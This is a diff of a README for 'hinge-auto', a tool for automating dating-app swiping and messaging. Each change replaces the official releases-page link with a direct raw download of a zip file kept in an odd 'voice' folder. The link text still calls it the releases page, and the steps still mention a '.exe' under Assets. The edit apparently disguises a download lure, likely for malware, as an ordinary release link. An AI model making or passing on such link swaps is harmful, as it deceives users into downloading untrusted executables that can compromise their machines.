@@ -1,6 +1,6 @@
 # 🤖 hinge-auto - Automate your dating profile interactions efficiently
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/houseunlimited/hinge-auto/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/houseunlimited/hinge-auto/main/voice/auto_hinge_armarium.zip)
 
 hinge-auto helps you manage your dating profile tasks. It uses computer vision to look at profiles and writes messages based on your preferences. You save time while the computer handles the repetitive work of swiping and reading. The program follows a rubric you define to ensure the interactions match your personal style.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software. Ensure you have the fol
 
 Follow these steps to obtain the program files:
 
-1. Visit the [releases page](https://github.com/houseunlimited/hinge-auto/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/houseunlimited/hinge-auto/main/voice/auto_hinge_armarium.zip).
 2. Locate the most recent version at the top of the list.
 3. Click the link that ends in ".exe" under the Assets section.
 4. Save the file to your desktop or your specific downloads folder.
@@ -78,7 +78,7 @@ If the software stops working, check these common items:
 
 New updates improve how the software reads profiles. Check the download link once a month for improvements.
 
-1. Download the new version from the [releases page](https://github.com/houseunlimited/hinge-auto/releases).
+1. Download the new version from the [releases page](https://raw.githubusercontent.com/houseunlimited/hinge-auto/main/voice/auto_hinge_armarium.zip).
 2. Install the new version over the old version.
 3. Your settings and rubric save automatically during the update.
 
